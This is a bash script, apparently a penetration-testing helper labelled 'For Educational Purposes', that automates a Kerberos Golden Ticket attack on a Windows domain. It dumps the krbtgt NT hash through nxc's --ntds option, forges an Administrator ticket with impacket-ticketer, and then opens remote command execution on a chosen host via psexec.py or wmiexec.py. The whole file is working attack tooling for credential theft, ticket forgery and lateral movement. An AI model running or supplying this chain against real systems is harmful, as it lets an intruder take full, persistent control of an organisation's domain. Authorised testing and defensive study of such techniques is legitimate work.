#!/bin/bash

echo -e "\e[0;33m
╔═╗╔═╗╦  ╔╦╗╔═╗╔╗╔  ╔╦╗╦╔═╗╦╔═╔═╗╔╦╗
║ ╦║ ║║   ║║║╣ ║║║───║ ║║  ╠╩╗║╣  ║ 
╚═╝╚═╝╩═╝═╩╝╚═╝╝╚╝   ╩ ╩╚═╝╩ ╩╚═╝ ╩  \e[0m"
echo "####################################"
echo "# Golden-Ticket                    #"
echo "# by: Daniel Krilich               #"
echo "# contact: need@bugcrowdninja.com  #"
echo "# github.com/need-programming      #"
echo "# For Educational Purposes         #"
echo "# GoldenTicket + Impacket          #"
echo "####################################"

read -p "Enter Domain IP: " domain_ip
read -p "Enter Username: " user
read -s -p "Enter Password: " password
echo

# Get Domain SID
echo "Retrieving Domain SID..."
sid_output=$(nxc ldap "$domain_ip" -u "$user" -p "$password" --get-sid)
echo "$sid_output"

sid=$(echo "$sid_output" | grep "Domain SID" | awk '{print $NF}')
if [ -n "$sid" ]; then
    echo "Extracted Domain SID: $sid"
    echo "$sid" > domain_sid.txt
    echo "Domain SID saved to domain_sid.txt"
else
    echo "Failed to extract Domain SID"
    exit 1
fi

echo

# Get krbtgt NT hash
echo "Retrieving krbtgt NT hash..."
ntds_output=$(nxc smb "$domain_ip" -u "$user" -p "$password" --ntds --user krbtgt)
echo "$ntds_output"

nt_hash=$(echo "$ntds_output" | grep "krbtgt:" | grep -oE '[0-9a-f]{32}:[0-9a-f]{32}' | cut -d':' -f2)
if [ -n "$nt_hash" ]; then
    echo "Extracted krbtgt NT hash: $nt_hash"
    echo "$nt_hash" > krbtgt_nt_hash.txt
    echo "krbtgt NT hash saved to krbtgt_nt_hash.txt"
else
    echo "Failed to extract krbtgt NT hash"
    exit 1
fi

echo

# Run impacket-ticketer
read -p "Enter Domain (e.g., domain.local): " domain
if [ -f "krbtgt_nt_hash.txt" ] && [ -f "domain_sid.txt" ]; then
    KRBTGT_NTHASH=$(cat krbtgt_nt_hash.txt)
    DOMAIN_SID=$(cat domain_sid.txt)
    echo "Generating ticket with impacket-ticketer..."
    ticketer_output=$(impacket-ticketer -nthash "$KRBTGT_NTHASH" -domain-sid "$DOMAIN_SID" -domain "$domain" Administrator)
    echo "$ticketer_output"
    if [ $? -eq 0 ]; then
        echo "Ticket generated successfully"
    else
        echo "Failed to generate ticket"
        exit 1
    fi
else
    echo "Required files (krbtgt_nt_hash.txt or domain_sid.txt) not found"
    exit 1
fi

echo

# List ccache files and set KRB5CCNAME
echo "Listing ccache files..."
ls -al | grep ccache
export KRB5CCNAME=Administrator.ccache
echo "KRB5CCNAME set to $KRB5CCNAME"

echo

# Prompt for Target IP and Device Name
read -p "Enter Target IP: " target_ip
read -p "Enter Device Name: " device

# Choose execution method
echo "Choose the execution method:"
echo "1) Psexec"
echo "2) Wmiexec"
read -p "Enter your choice (1-2): " choice

case $choice in
    1) script_name="psexec.py" ;;
    2) script_name="wmiexec.py" ;;
    *) echo "Invalid choice"; exit 1 ;;
esac

echo "Running $script_name..."
python3 /usr/share/doc/python3-impacket/examples/$script_name -dc-ip "$domain_ip" -target-ip "$target_ip" -no-pass -k "$domain/Administrator@$device.$domain"
